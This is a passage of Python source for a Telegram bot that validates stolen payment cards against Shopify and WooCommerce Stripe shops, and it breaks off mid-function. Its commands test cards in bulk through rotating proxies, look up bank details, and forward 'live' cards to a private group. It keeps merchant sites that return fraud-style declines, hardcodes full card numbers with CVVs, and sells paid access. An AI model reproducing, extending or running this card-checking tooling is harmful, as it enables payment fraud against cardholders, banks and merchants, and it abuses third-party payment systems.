    # ── Pass 2: retry failed users ───────────────────────────────────────────
    if failed_ids:
        retry_list = list(failed_ids)
        failed_ids.clear()
        counters["failed"] = 0
        counters["done"] = 0
        total_retry = len(retry_list)
        total = total_retry

        try:
            await safe_edit(status_msg, 
                f"{pe(E['refresh'])} {bold('Retrying')} {bold(str(total_retry))} {bold('failed users...')}"
            )
        except Exception:
            pass

        await asyncio.sleep(2)
        prog_task2 = asyncio.create_task(_update_progress("Retrying failed..."))
        await asyncio.gather(*[_send_one(uid) for uid in retry_list])
        prog_task2.cancel()

    # ── Final summary ─────────────────────────────────────────────────────────
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('Broadcast Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total Users:')} {bold(str(len(all_ids)))}\n"
            f"{pe(E['check'])} {bold('Delivered:')} {bold(str(counters['sent']))}\n"
            f"{pe(E['star'])} {bold('Pinned:')} {bold(str(counters['pinned']))}\n"
            f"{pe(E['cross'])} {bold('Blocked/Deactivated:')} {bold(str(counters['blocked']))}\n"
            f"{pe(E['warn'])} {bold('Still Failed:')} {bold(str(counters['failed']))}"
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /filter COMMAND — Owner-only site filter (100 parallel, keep good sites)
# ══════════════════════════════════════════════════════════════════════════════

_FILTER_CC = "5324430102980098|07|2032|670"

_FILTER_GOOD_RESPONSES = {
    "card_declined", "otp_required", "fraudulent",
    "pick_up_card", "stolen_card", "fraud_suspected",
    "authentication_required",  # maps to OTP_REQUIRED in format_result
}

FILTER_BATCH_SIZE = 100


async def _filter_check_site(site: str, proxy_data: dict | None) -> dict:
    """Check a single site with the hardcoded CC and return verdict."""
    try:
        result = await checker_bridge.check_card_site(_FILTER_CC, site, proxy_data)
    except Exception as e:
        return {"site": site, "keep": False, "reason": str(e)[:60]}

    response = (result.get("Response") or "").lower()
    gate = (result.get("Gate") or "").lower()
    price_raw = result.get("Price", "-")

    # ── Parse price ───────────────────────────────────────────────────────────
    price_val = 999.0
    try:
        price_num = re.sub(r'[^\d.]', '', str(price_raw).split()[0])
        if price_num:
            price_val = float(price_num)
    except Exception:
        pass

    # ── Check criteria ────────────────────────────────────────────────────────
    price_ok = price_val < 10.0
    gate_ok = "shopify payments" in gate
    response_ok = any(r in response for r in _FILTER_GOOD_RESPONSES)

    keep = price_ok and gate_ok and response_ok

    return {
        "site": site,
        "keep": keep,
        "response": result.get("Response", "?"),
        "gate": result.get("Gate", "?"),
        "price": price_raw,
    }


@router.message(Command("filter"))
async def cmd_filter(message: types.Message):
    log.info(f"[FILTER] Command received from user_id={message.from_user.id}")
    user_id = message.from_user.id

    if not auth.is_owner(user_id):
        log.info(f"[FILTER] Denied — user {user_id} is not owner (OWNER_ID={auth.OWNER_ID})")
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    log.info("[FILTER] Owner verified, loading sites...")

    # ── Load sites ────────────────────────────────────────────────────────────
    sites_list = _load_sites()
    log.info(f"[FILTER] Loaded {len(sites_list)} sites from sites.txt")
    if not sites_list:
        await message.reply(f"{pe(E['cross'])} {bold('sites.txt is empty!')}")
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add a proxy first:')} /proxy host:port:user:pass"
        )
        return

    total = len(sites_list)

    status_msg = await message.reply(
        f"{pe(E['rocket'])} {bold('Site Filter Started!')}\n\n"
        f"{pe(E['bolt'])} {bold('Total Sites:')} {bold(str(total))}\n"
        f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(FILTER_BATCH_SIZE))}\n"
        f"{pe(R['cc'])} {bold('Test CC:')} <tg-spoiler>{_FILTER_CC}</tg-spoiler>\n\n"
        f"{pe(E['star'])} {bold('Criteria:')}\n"
        f"{pe(E['next'])} {bold('Price < $10')}\n"
        f"{pe(E['next'])} {bold('Gate = Shopify Payments')}\n"
        f"{pe(E['next'])} {bold('Response = Declined / OTP / Fraud / Stolen')}\n\n"
        f"{pe(E['loading'])} {bold('Processing...')}"
    )

    kept_sites = []
    removed = 0
    checked = 0
    errors = 0
    _last_edit = 0.0
    proxy_list = get_user_proxies(user_id)

    for batch_start in range(0, total, FILTER_BATCH_SIZE):
        batch = sites_list[batch_start:batch_start + FILTER_BATCH_SIZE]

        tasks = []
        for site in batch:
            p = random.choice(proxy_list) if proxy_list else proxy_data
            tasks.append(_filter_check_site(site, p))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            checked += 1
            if isinstance(r, Exception):
                errors += 1
                removed += 1
                continue
            if r.get("keep"):
                kept_sites.append(r["site"])
            else:
                removed += 1

        # ── Update progress every 3 seconds ───────────────────────────────────
        _now = time.time()
        if _now - _last_edit >= 3 or checked >= total:
            _last_edit = _now
            try:
                await safe_edit(status_msg, 
                    f"{pe(E['rocket'])} {bold('Filtering Sites...')}\n\n"
                    f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked))}/{bold(str(total))}\n"
                    f"{pe(E['check'])} {bold('Kept:')} {bold(str(len(kept_sites)))}\n"
                    f"{pe(E['cross'])} {bold('Removed:')} {bold(str(removed))}\n"
                    f"{pe(E['warn'])} {bold('Errors:')} {bold(str(errors))}\n\n"
                    f"{pe(E['loading'])} {bold('Processing...')}"
                )
            except Exception:
                pass

    # ── Save filtered sites back to sites.txt ─────────────────────────────────
    global _sites_cache, _sites_cache_mtime
    with open(SITES_FILE, "w", encoding="utf-8") as f:
        for site in kept_sites:
            f.write(site.strip() + "\n")
    _sites_cache = [s.strip() for s in kept_sites if s.strip()]
    try:
        _sites_cache_mtime = os.path.getmtime(SITES_FILE)
    except OSError:
        _sites_cache_mtime = 0.0

    # ── Final summary ─────────────────────────────────────────────────────────
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('Site Filter Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total Checked:')} {bold(str(total))}\n"
            f"{pe(E['check'])} {bold('Kept:')} {bold(str(len(kept_sites)))}\n"
            f"{pe(E['cross'])} {bold('Removed:')} {bold(str(removed))}\n"
            f"{pe(E['warn'])} {bold('Errors:')} {bold(str(errors))}\n\n"
            f"{pe(E['star'])} {bold('sites.txt updated!')} {bold(str(len(kept_sites)))} {bold('sites remaining.')}"
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ST SITE STORAGE (stsite.json) — per-user WooCommerce site for /st /mst /stxt
# ══════════════════════════════════════════════════════════════════════════════

_ST_TEST_CC = "4147202717295883|12|2029|140"

_stsite_cache: dict | None = None
_stsite_cache_mtime: float = 0.0
STSITE_MAX = 25  # max sites per user

def _load_stsites() -> dict:
    global _stsite_cache, _stsite_cache_mtime
    try:
        mt = os.path.getmtime(STSITE_FILE)
    except OSError:
        return {}
    if _stsite_cache is not None and mt == _stsite_cache_mtime:
        return _stsite_cache
    try:
        with open(STSITE_FILE, "r", encoding="utf-8") as f:
            _stsite_cache = json.load(f)
            _stsite_cache_mtime = mt
            return _stsite_cache
    except Exception:
        return {}

def _save_stsites(data: dict):
    global _stsite_cache, _stsite_cache_mtime
    with open(STSITE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _stsite_cache = data
    try:
        _stsite_cache_mtime = os.path.getmtime(STSITE_FILE)
    except OSError:
        _stsite_cache_mtime = 0.0

def _normalize_stsite_url(url: str) -> str:
    return url.strip().replace("https://", "").replace("http://", "").strip("/")

def _coerce_stsite_list(val) -> list:
    """Backward-compat: old format was a plain string, new format is a list."""
    if isinstance(val, str):
        return [val] if val else []
    if isinstance(val, list):
        return val
    return []

def get_user_stsites(user_id: int) -> list[str]:
    """Return all saved ST sites for a user."""
    return _coerce_stsite_list(_load_stsites().get(str(user_id)))

def get_user_stsite(user_id: int) -> str | None:
    """Return a random site from the user's list, or None if empty."""
    sites = get_user_stsites(user_id)
    return random.choice(sites) if sites else None

def add_user_stsite(user_id: int, url: str) -> str:
    """Add a site. Returns 'added', 'duplicate', or 'limit'."""
    url = _normalize_stsite_url(url)
    data = _load_stsites()
    sites = _coerce_stsite_list(data.get(str(user_id)))
    if url in sites:
        return "duplicate"
    if len(sites) >= STSITE_MAX:
        return "limit"
    sites.append(url)
    data[str(user_id)] = sites
    _save_stsites(data)
    return "added"

def set_user_stsite(user_id: int, url: str):
    """Legacy alias — adds url to list (called by /sadd after site test)."""
    add_user_stsite(user_id, url)

def del_user_stsite(user_id: int, index: int | None = None):
    """Remove site by 1-based index, or all sites if index is None."""
    data = _load_stsites()
    key = str(user_id)
    sites = _coerce_stsite_list(data.get(key))
    if index is None:
        data.pop(key, None)
    else:
        if 1 <= index <= len(sites):
            sites.pop(index - 1)
            if sites:
                data[key] = sites
            else:
                data.pop(key, None)
    _save_stsites(data)

def _proxy_dict_to_url(proxy_data: dict) -> str | None:
    from helpers import proxy_dict_to_url
    return proxy_dict_to_url(proxy_data)

_ST_VALID_RESPONSES = ("card added", "3d requires_action", "card was declined")

def _st_status_line(msg: str) -> str:
    ml = msg.lower().strip()
    if "card added" in ml:
        return f"{pe(E['gem'])} {bold('Card Added!')}"
    if "3d requires_action" in ml or "requires_action" in ml:
        return f"{pe(E['check'])} {bold('3DS Required — Live')}"
    if "card was declined" in ml or "declined" in ml:
        return f"{pe(E['cross'])} {bold('Declined')}"
    if "insufficient" in ml:
        return f"{pe(E['check2'])} {bold('Insufficient Funds — Live')}"
    if "incorrect_cvc" in ml or "invalid_cvc" in ml:
        return f"{pe(E['check3'])} {bold('Incorrect CVC — Live')}"
    if "expired" in ml:
        return f"{pe(E['cross2'])} {bold('Card Expired')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"

def _st_is_working_response(msg: str) -> bool:
    ml = msg.lower().strip()
    return any(r in ml for r in _ST_VALID_RESPONSES)


# ── /sadd — Add / test WooCommerce sites (1 or many) ─────────────────────────

def _parse_sadd_urls(raw: str) -> list[str]:
    """
    Extract clean domain/URL tokens from bulk-paste input.
    Handles:
      • One per line: "example.com\nfoo.com"
      • Inline Markdown links: "site.com (https://site.com/)"
      • Mixed whitespace
    """
    # Replace newlines with spaces so we can split uniformly
    flat = raw.replace("\n", " ").replace("\r", " ")
    tokens = flat.split()
    seen = set()
    result = []
    for tok in tokens:
        # Skip parenthesised http(s) link wrappers like "(https://site.com/)"
        if tok.startswith("(") and "http" in tok:
            continue
        # Strip surrounding punctuation/parens
        tok = tok.strip("()")
        # Must look like a domain (has a dot, no spaces, not just a protocol)
        if "." not in tok or tok.startswith("http"):
            # Accept raw http/https URLs too — normalize them
            if tok.startswith("http://") or tok.startswith("https://"):
                clean = _normalize_stsite_url(tok)
                if clean and clean not in seen:
                    seen.add(clean)
                    result.append(clean)
            continue
        clean = _normalize_stsite_url(tok)
        if clean and clean not in seen:
            seen.add(clean)
            result.append(clean)
    return result


@router.message(Command("sadd"))
async def cmd_sadd(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    # Extract everything after /sadd (handles both inline and next-line formats)
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        sites = get_user_stsites(user_id)
        usage = (
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /sadd {bold('example.com')}\n"
            f"{pe(E['next'])} {bold('Paste multiple sites (one per line) after /sadd')}\n\n"
            f"{pe(E['bolt'])} {bold('Adds working WooCommerce sites (max 25 total)')}\n"
            f"{pe(E['star'])} {bold('A random site is picked each check.')}\n"
            f"{pe(E['cross'])} {bold('Remove:')} /srem {bold('N')} {bold('or /srem all')}"
        )
        if sites:
            numbered = "\n".join(f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}" for i, s in enumerate(sites))
            usage += f"\n\n{pe(E['check'])} {bold(f'Your sites ({len(sites)}/25):')}\n{numbered}"
        await message.reply(usage)
        return

    urls_to_test = _parse_sadd_urls(args[1])
    if not urls_to_test:
        await message.reply(
            f"{pe(E['warn'])} {bold('No valid sites found in your message.')}\n\n"
            f"{pe(E['next'])} {bold('Send domains like:')} example.com"
        )
        return

    proxy_data = get_user_proxy(user_id)
    proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
    _px_list = [_proxy_dict_to_url(p) for p in get_user_proxies(user_id) if _proxy_dict_to_url(p)]

    added_list: list[str] = []
    failed_list: list[str] = []
    skipped_dup: list[str] = []
    skipped_limit: list[str] = []

    _SADD_BATCH   = 25   # parallel test slots per batch
    _SADD_RETRIES = 2    # attempts per site before marking failed

    async def _test_one_stsite(url: str) -> tuple[str, bool, str]:
        """Test a single ST site with up to _SADD_RETRIES attempts. Returns (url, ok, response)."""
        last_resp = "No response"
        for attempt in range(_SADD_RETRIES):
            try:
                res = await asyncio.get_running_loop().run_in_executor(
                    CHECKER_POOL, lambda u=url: st.VW(_ST_TEST_CC, u, proxy_url, proxy_list=_px_list)
                )
                last_resp = str(res).strip()
                if _st_is_working_response(last_resp):
                    return url, True, last_resp
            except Exception as exc:
                last_resp = str(exc)[:80]
        return url, False, last_resp

    total = len(urls_to_test)
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold(f'Testing {total} site(s) in batches of 25...')}\n\n"
        f"{pe(R['cc'])} {bold('Test CC:')} <tg-spoiler>{_ST_TEST_CC}</tg-spoiler>\n"
        f"{pe(E['hourglass'])} {bold('Starting...')}"
    )

    processed = 0
    for batch_start in range(0, total, _SADD_BATCH):
        # Pre-check: separate sites that need testing from those already done/over limit
        remaining_slots = STSITE_MAX - len(get_user_stsites(user_id))
        batch_raw = urls_to_test[batch_start: batch_start + _SADD_BATCH]

        to_test = []
        for url in batch_raw:
            current = get_user_stsites(user_id)
            if url in current:
                skipped_dup.append(url)
            elif len(current) + len(to_test) >= STSITE_MAX:
                skipped_limit.append(url)
            else:
                to_test.append(url)

        # If nothing left to test in this batch (all dup/limit), skip the rest
        if skipped_limit:
            remaining_urls = [u for u in urls_to_test[batch_start + _SADD_BATCH:] if u not in skipped_dup]
            skipped_limit.extend(remaining_urls)
            processed += len(batch_raw)
            break

        if not to_test:
            processed += len(batch_raw)
            continue

        # Progress update
        await safe_edit(loading_msg,
            f"{pe(E['loading'])} {bold(f'Batch {batch_start // _SADD_BATCH + 1} — testing {len(to_test)} sites in parallel...')}\n\n"
            f"{pe(E['check'])} {bold(f'Added: {len(added_list)}')}"
            f"  {pe(E['cross'])} {bold(f'Failed: {len(failed_list)}')}"
            f"  {pe(E['hourglass'])} {bold(f'Done: {processed}/{total}')}"
        )

        # Run entire batch in parallel
        results = await asyncio.gather(*[_test_one_stsite(u) for u in to_test])
        processed += len(batch_raw)

        for url, ok, resp in results:
            if ok:
                add_user_stsite(user_id, url)
                added_list.append(url)
                try:
                    await bot.send_message(
                        auth.APPROVED_GROUP_ID,
                        f"{pe(E['check'])} {bold('ST Site Saved!')}\n"
                        f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, message.from_user.full_name, message.from_user.username or '')}\n"
                        f"{pe(E['globe'])} {bold('Site:')} {bold(url)}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(resp)}",
                        disable_notification=True,
                    )
                except Exception:
                    pass
            else:
                failed_list.append(f"{url} — {resp[:55]}")

    # Final summary
    final_count = len(get_user_stsites(user_id))
    lines = [f"{pe(E['check'])} {bold(f'Done! Your sites: {final_count}/25')}\n"]

    if added_list:
        lines.append(f"{pe(E['check'])} {bold(f'Added ({len(added_list)}):')} "
                     + ", ".join(bold(s) for s in added_list))

    if failed_list:
        lines.append(f"{pe(E['cross'])} {bold(f'Failed ({len(failed_list)}):')} "
                     + "\n  ".join(bold(s) for s in failed_list))

    if skipped_dup:
        lines.append(f"{pe(E['warn'])} {bold(f'Already in list ({len(skipped_dup)}):')} "
                     + ", ".join(bold(s) for s in skipped_dup))

    if skipped_limit:
        lines.append(f"{pe(E['warn'])} {bold(f'Skipped — limit reached ({len(skipped_limit)}):')} "
                     + ", ".join(bold(s[:30]) for s in skipped_limit[:5])
                     + (f"... +{len(skipped_limit)-5}" if len(skipped_limit) > 5 else ""))

    if added_list:
        lines.append(f"\n{pe(E['bolt'])} {bold('Use /st /mst /stxt — random site picked each run')}")

    await safe_edit(loading_msg, "\n".join(lines))


# ── /srem — Remove saved site(s) ─────────────────────────────────────────────

@router.message(Command("srem"))
async def cmd_srem(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    sites = get_user_stsites(user_id)
    if not sites:
        await message.reply(f"{pe(E['warn'])} {bold('No sites saved! Use /sadd to add one.')}")
        return

    args = message.text.split(maxsplit=1)
    arg = args[1].strip() if len(args) > 1 else ""

    if not arg:
        numbered = "\n".join(f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}" for i, s in enumerate(sites))
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /srem {bold('1')} — {bold('remove site #1')}\n"
            f"{pe(E['next'])} /srem {bold('all')} — {bold('remove all sites')}\n\n"
            f"{pe(E['check'])} {bold(f'Your sites ({len(sites)}/25):')}\n{numbered}"
        )
        return

    if arg.lower() == "all":
        del_user_stsite(user_id)
        await message.reply(f"{pe(E['check'])} {bold('All ST sites removed!')}")
        return

    try:
        idx = int(arg)
    except ValueError:
        await message.reply(f"{pe(E['warn'])} {bold('Use a number: /srem 1')} or {bold('/srem all')}")
        return

    if idx < 1 or idx > len(sites):
        await message.reply(f"{pe(E['warn'])} {bold(f'Invalid number. You have {len(sites)} site(s).')}")
        return

    removed = sites[idx - 1]
    del_user_stsite(user_id, idx)
    await message.reply(
        f"{pe(E['check'])} {bold('Site removed!')}\n\n"
        f"{pe(E['globe'])} {bold(removed)}"
    )


# ── /smysite — View saved sites ──────────────────────────────────────────────

@router.message(Command("smysite"))
async def cmd_smysite(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    sites = get_user_stsites(user_id)
    if not sites:
        await message.reply(
            f"{pe(E['warn'])} {bold('No sites saved!')}\n\n"
            f"{pe(E['next'])} {bold('Use /sadd example.com to add a WooCommerce site.')}"
        )
        return

    numbered = "\n".join(
        f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}"
        for i, s in enumerate(sites)
    )
    await message.reply(
        f"{pe(E['check'])} {bold(f'Your ST Sites ({len(sites)}/25):')}\n\n"
        f"{numbered}\n\n"
        f"{pe(E['bolt'])} {bold('Commands:')} /st /mst /stxt {bold('(random site each run)')}\n"
        f"{pe(E['cross'])} {bold('Remove:')} /srem {bold('N')} {bold('or /srem all')}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /st — Single WooCommerce Stripe check
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("st"))
async def cmd_st(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])

    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /st 4388540109154632|03|2030|815\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    site_url = get_user_stsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No ST site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /sadd example.com to add your WooCommerce site first.')}"
        )
        return

    proxy_data = get_user_proxy(user_id)
    proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
    _px_list = [_proxy_dict_to_url(p) for p in get_user_proxies(user_id) if _proxy_dict_to_url(p)]

    bin_num = cc_str.split("|")[0][:6]

    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['hourglass'])} {bold('Processing with WooCommerce gateway...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            result_str = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: st.VW(cc_str, site_url, proxy_url, proxy_list=_px_list))
        except Exception as e:
            result_str = str(e)[:80]
    bin_info = await _bin

    result_str = str(result_str).strip()
    sl = _st_status_line(result_str)

    result_text = (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold('WooCommerce Stripe')}\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(result_str)}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    # Approved (live, not charged): send to approved group silently
    _st_ml = result_str.lower()
    if any(k in _st_ml for k in ["3d requires_action", "requires_action", "insufficient", "incorrect_cvc", "invalid_cvc"]):
        await _send_approved(result_text)


# ══════════════════════════════════════════════════════════════════════════════
#  /mst — Mass WooCommerce Stripe check (max 10 inline)
# ══════════════════════════════════════════════════════════════════════════════

MST_MAX_CCS = 10
_MST_EDIT_LOCKS: dict[int, asyncio.Lock] = {}


async def _mst_check_single(
    cc_str: str, site_url: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    proxy_data = random.choice(proxy_list) if proxy_list else None
    proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
    _px_urls = [_proxy_dict_to_url(p) for p in proxy_list if _proxy_dict_to_url(p)] if proxy_list else []

    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            result_str = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: st.VW(cc_str, site_url, proxy_url, proxy_list=_px_urls),
            )
        except Exception as e:
            result_str = str(e)[:80]

    result_str = str(result_str).strip()

    bin_info = await _bin
    results[cc_str] = {"msg": result_str, "bin": bin_info}

    msg_id = status_msg.message_id
    if msg_id not in _MST_EDIT_LOCKS:
        _MST_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MST_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)

        lines = [
            f"{pe(E['bolt'])} {bold('ST Mass Check')} [{bold(str(done_count))}/{bold(str(total))}]\n"
            ]

        for cc in order:
            if cc in results:
                entry = results[cc]
                sl = _st_status_line(entry["msg"])
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(entry['msg'])}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if sum(1 for cc in order if cc in results) == len(order):
        _MST_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("mst"))
async def cmd_mst(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')}\n"
            f"/mst cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv"
        )
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MST_MAX_CCS]

    site_url = get_user_stsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No ST site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /sadd example.com first.')}"
        )
        return

    proxy_list = get_user_proxies(user_id)

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    init_lines = [
        f"{pe(E['bolt'])} {bold('ST Mass Check')} [{bold('0')}/{bold(str(total))}]\n"
    ]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)

    tasks = [
        asyncio.create_task(
            _mst_check_single(cc, site_url, proxy_list, status_msg, results, order, user_name, user_uname, user_id)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Send approved (live, not charged) results to approved group silently
    for cc in order:
        if cc in results:
            _mst_ml = results[cc]["msg"].lower()
            if any(k in _mst_ml for k in ["3d requires_action", "requires_action", "insufficient", "incorrect_cvc", "invalid_cvc"]):
                bi = results[cc]["bin"]
                bin_line = f"{bi['brand']} | {bi['type']} | {bi['level']} | {bi['bank']} | {bi['flag']} {bi['country']}"
                appr_text = (
                    f"{_st_status_line(results[cc]['msg'])}\n\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('WooCommerce Stripe')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(results[cc]['msg'])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                )
                await _send_approved(appr_text)


# ══════════════════════════════════════════════════════════════════════════════
#  /stxt — WooCommerce Stripe file check (reply to .txt)
# ══════════════════════════════════════════════════════════════════════════════

_STXT_ACTIVE_USERS: set[int] = set()
_STXT_STOP_FLAGS: dict[str, bool] = {}
STXT_BATCH_SIZE = 5


async def _process_stxt_cards(
    all_ccs: list, user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message, stop_key: str,
    site_url: str,
):
    total = len(all_ccs)
    checked, approved, declined = 0, 0, 0
    approved_ccs: list[str] = []
    _start_time = time.time()
    _last_status_edit = 0.0

    proxy_list = get_user_proxies(user_id)
    _px_urls = [_proxy_dict_to_url(p) for p in proxy_list if _proxy_dict_to_url(p)] if proxy_list else []

    try:
        for i in range(0, len(all_ccs), STXT_BATCH_SIZE):
            if _STXT_STOP_FLAGS.get(stop_key):
                break

            batch = all_ccs[i:i + STXT_BATCH_SIZE]
            tasks = []

